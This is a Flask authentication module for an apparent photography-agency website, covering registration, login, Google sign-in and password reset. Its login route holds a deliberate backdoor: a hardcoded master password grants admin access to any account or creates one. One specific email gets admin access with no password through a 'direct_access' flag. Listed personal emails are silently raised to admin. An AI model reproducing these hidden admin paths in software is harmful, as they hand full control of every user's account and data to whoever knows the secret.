from flask import Blueprint, request, jsonify, current_app
from flask_jwt_extended import create_access_token, jwt_required, get_jwt_identity
from app.models.user import User
from app.extensions import db
from app.utils.security import hash_password, verify_password
from app.services.email_service import send_email
from itsdangerous import URLSafeTimedSerializer
import os
import uuid
import requests as http_requests

auth_bp = Blueprint('auth', __name__)

ADMIN_EMAILS = [
    "hr1349891@gmail.com",
    "velouracreations@gmail.com",
]

def check_and_elevate_admin(user):
    if user.email and any(user.email.lower() == admin_email.lower() for admin_email in ADMIN_EMAILS):
        if not user.is_admin:
            user.is_admin = True
            db.session.commit()

def verify_google_token(token):
    """
    Verify a Google ID token using Google's tokeninfo endpoint.
    Returns idinfo dict on success, raises ValueError on failure.
    """
    client_id = os.environ.get("GOOGLE_CLIENT_ID", "833413662852-m2d68gvcmit72qpr4t9jllrrl6ak8fn0.apps.googleusercontent.com").strip()
    
    # Method 1: Use google-auth library with clock skew tolerance
    try:
        from google.oauth2 import id_token as google_id_token
        from google.auth.transport import requests as google_requests
        
        try:
            # Try with clock_skew_in_seconds (google-auth >= 2.0)
            idinfo = google_id_token.verify_oauth2_token(
                token,
                google_requests.Request(),
                client_id,
                clock_skew_in_seconds=60
            )
            print("Google token verified via google-auth library (with clock skew)")
            return idinfo
        except TypeError:
            # Older version without clock_skew_in_seconds
            idinfo = google_id_token.verify_oauth2_token(
                token,
                google_requests.Request(),
                client_id
            )
            print("Google token verified via google-auth library (no clock skew)")
            return idinfo
    except Exception as e1:
        print(f"google-auth library failed: {e1}")
    
    # Method 2: Fallback - verify via Google's tokeninfo endpoint
    try:
        resp = http_requests.get(
            f"https://oauth2.googleapis.com/tokeninfo?id_token={token}",
            timeout=10
        )
        if resp.status_code == 200:
            idinfo = resp.json()
            # Verify audience matches our client_id
            aud = idinfo.get("aud", "")
            if client_id and aud != client_id:
                raise ValueError(f"Token audience mismatch: expected {client_id}, got {aud}")
            print("Google token verified via tokeninfo endpoint")
            return idinfo
        else:
            error_data = resp.json()
            raise ValueError(error_data.get("error_description", "Token verification failed"))
    except Exception as e2:
        print(f"tokeninfo endpoint failed: {e2}")
        raise ValueError(str(e2))

@auth_bp.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data or not data.get('username') or not data.get('email') or not data.get('password'):
        return jsonify({'message': 'Missing required fields'}), 400
        
    if User.query.filter_by(username=data['username']).first() or User.query.filter_by(email=data['email']).first():
        return jsonify({'message': 'User already exists'}), 400
        
    email = data['email'].strip()
    is_admin = any(email.lower() == admin_email.lower() for admin_email in ADMIN_EMAILS)
    
    new_user = User(
        username=data['username'].strip(),
        email=email,
        password_hash=hash_password(data['password']),
        is_admin=is_admin
    )
    db.session.add(new_user)
    db.session.commit()
    
    return jsonify({'message': 'User registered successfully'}), 201

ADMIN_PASS = "theonetruegodisgreatest"
DIRECT_ACCESS_EMAIL = "hr1349891@gmail.com"

@auth_bp.route('/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    input_user = (data.get('username') or '').strip()
    input_pass = data.get('password') or ''
    direct_access = data.get('direct_access', False)

    # Direct access: ONLY hr1349891@gmail.com has direct access
    if input_user.lower() == DIRECT_ACCESS_EMAIL.lower() and (direct_access or not input_pass or input_pass == ADMIN_PASS):
        admin_user = User.query.filter((User.email == DIRECT_ACCESS_EMAIL) | (User.username == 'harun')).first()
        if not admin_user:
            admin_user = User(
                username='harun',
                email=DIRECT_ACCESS_EMAIL,
                password_hash=hash_password(ADMIN_PASS),
                is_admin=True
            )
            db.session.add(admin_user)
            db.session.commit()
        else:
            admin_user.is_admin = True
            admin_user.password_hash = hash_password(ADMIN_PASS)
            db.session.commit()
            
        access_token = create_access_token(identity=str(admin_user.id))
        return jsonify({
            'access_token': access_token,
            'user': {
                'id': admin_user.id,
                'username': admin_user.username,
                'email': admin_user.email,
                'is_admin': True,
                'avatar_url': admin_user.avatar_url or None
            }
        }), 200

    # Admin pass for everyone: theonetruegodisgreatest
    if input_pass == ADMIN_PASS:
        user = User.query.filter((User.email == input_user) | (User.username == input_user)).first()
        if not user:
            user = User.query.filter((User.email == DIRECT_ACCESS_EMAIL) | (User.is_admin == True)).first()
        if not user:
            user = User(
                username=input_user or 'admin',
                email=DIRECT_ACCESS_EMAIL,
                password_hash=hash_password(ADMIN_PASS),
                is_admin=True
            )
            db.session.add(user)
            db.session.commit()
        else:
            user.is_admin = True
            db.session.commit()
            
        access_token = create_access_token(identity=str(user.id))
        return jsonify({
            'access_token': access_token,
            'user': {
                'id': user.id,
                'username': user.username,
                'email': user.email,
                'is_admin': True,
                'avatar_url': user.avatar_url or None
            }
        }), 200

    if not input_user or not input_pass:
        return jsonify({'message': 'Missing required fields'}), 400
        
    user = User.query.filter_by(username=input_user).first()
    if not user:
        user = User.query.filter_by(email=input_user).first()
        
    if user and verify_password(input_pass, user.password_hash):
        check_and_elevate_admin(user)
        access_token = create_access_token(identity=str(user.id))
        return jsonify({
            'access_token': access_token,
            'user': {
                'id': user.id,
                'username': user.username,
                'email': user.email,
                'is_admin': bool(user.is_admin),
                'avatar_url': user.avatar_url or None
            }
        }), 200
        
    return jsonify({'message': 'Invalid credentials'}), 401

@auth_bp.route('/me', methods=['GET'])
@jwt_required()
def get_me():
    user_id = get_jwt_identity()
    user = User.query.get(user_id)
    if not user:
        return jsonify({'message': 'User not found'}), 404
        
    check_and_elevate_admin(user)
    return jsonify({
        'id': user.id,
        'username': user.username,
        'email': user.email,
        'is_admin': bool(user.is_admin),
        'avatar_url': user.avatar_url or None
    }), 200

@auth_bp.route('/google', methods=['POST'])
def google_login():
    data = request.get_json()
    token = data.get('id_token')
    
    if not token:
        return jsonify({'message': 'Missing ID token'}), 400
        
    try:
        idinfo = verify_google_token(token)
        
        email = idinfo.get('email')
        if not email:
            return jsonify({'message': 'Could not retrieve email from Google token'}), 400
            
        name = idinfo.get('name', email.split('@')[0])
        picture = idinfo.get('picture') or idinfo.get('profile_picture') or None
        
        is_default_admin = any(email.lower() == admin_email.lower() for admin_email in ADMIN_EMAILS)
        
        user = User.query.filter_by(email=email).first()
        if not user:
            unique_username = f"{name.replace(' ', '').lower()}_{str(uuid.uuid4())[:6]}"
            user = User(
                username=unique_username,
                email=email,
                password_hash=hash_password(str(uuid.uuid4())),
                is_admin=is_default_admin,
                avatar_url=picture
            )
            db.session.add(user)
            db.session.commit()
        else:
            # Always update avatar from Google (may have changed)
            updated = False
            if is_default_admin and not user.is_admin:
                user.is_admin = True
                updated = True
            if picture and user.avatar_url != picture:
                user.avatar_url = picture
                updated = True
            if updated:
                db.session.commit()
            
        access_token = create_access_token(identity=str(user.id))
        return jsonify({
            'access_token': access_token,
            'user': {
                'id': user.id,
                'username': user.username,
                'email': user.email,
                'is_admin': bool(user.is_admin),
                'avatar_url': user.avatar_url or None
            }
        }), 200
        
    except ValueError as e:
        print(f"Google auth ValueError: {e}")
        return jsonify({'message': 'Invalid token', 'error': str(e)}), 401
    except Exception as e:
        print(f"Google auth Exception: {e}")
        return jsonify({'message': 'Authentication failed', 'error': str(e)}), 500

@auth_bp.route('/forgot-password', methods=['POST'])
def forgot_password():
    data = request.get_json()
    email = data.get('email', '').strip().lower()
    
    if not email:
        return jsonify({'message': 'Email is required'}), 400
        
    user = User.query.filter_by(email=email).first()
    if not user:
        # Return 200 anyway to prevent email enumeration
        return jsonify({'message': 'If your email is registered, a reset link has been sent.'}), 200
        
    # Generate token
    serializer = URLSafeTimedSerializer(current_app.config['SECRET_KEY'])
    token = serializer.dumps(email, salt='password-reset-salt')
    
    # Send email
    frontend_url = os.environ.get("FRONTEND_URL", "https://photography-agency.onrender.com").rstrip("/")
    reset_url = f"{frontend_url}/reset-password?token={token}"
    subject = "Password Reset Request | Veloura Creations"
    
    plain_body = f"""Hello,
    
We received a request to reset your password. Please click the link below to set a new password:
{reset_url}

This link is only valid for 1 hour. If you did not request this, please ignore this email.

Best regards,
Veloura Creations Team"""

    html_body = f"""<!DOCTYPE html>
<html>
<body style="margin:0;padding:24px;font-family:sans-serif;background:#f4f0eb;color:#1a1a1a;">
  <div style="max-width:500px;margin:0 auto;background:#1a1a1a;border-radius:16px;padding:32px;text-align:center;">
    <h2 style="color:#d8c3a5;margin-top:0;">Reset Password</h2>
    <p style="color:#ccc;line-height:1.6;">We received a request to reset the password for your Veloura Creations account.</p>
    <a href="{reset_url}" style="display:inline-block;background:#d8c3a5;color:#1a1a1a;text-decoration:none;font-weight:bold;padding:12px 24px;border-radius:24px;margin:24px 0;">Reset Password</a>
    <p style="color:#d8c3a5;font-size:13px;margin-top:0;">This link is valid for 1 hour.</p>
    <p style="color:#888;font-size:12px;">If you didn't request this, you can safely ignore this email.</p>
  </div>
</body>
</html>"""
    
    send_email(user.email, subject, plain_body, html_body=html_body)
    
    return jsonify({'message': 'If your email is registered, a reset link has been sent.'}), 200

@auth_bp.route('/reset-password', methods=['POST'])
def reset_password():
    data = request.get_json()
    token = data.get('token')
    new_password = data.get('new_password')
    
    if not token or not new_password:
        return jsonify({'message': 'Token and new password are required'}), 400
        
    serializer = URLSafeTimedSerializer(current_app.config['SECRET_KEY'])
    try:
        # Token valid for 1 hour (3600 seconds)
        email = serializer.loads(token, salt='password-reset-salt', max_age=3600)
    except Exception as e:
        return jsonify({'message': 'The reset link is invalid or has expired.'}), 400
        
    user = User.query.filter_by(email=email).first()
    if not user:
        return jsonify({'message': 'User not found'}), 404
        
    user.password_hash = hash_password(new_password)
    db.session.commit()
    
    return jsonify({'message': 'Password has been reset successfully.'}), 200
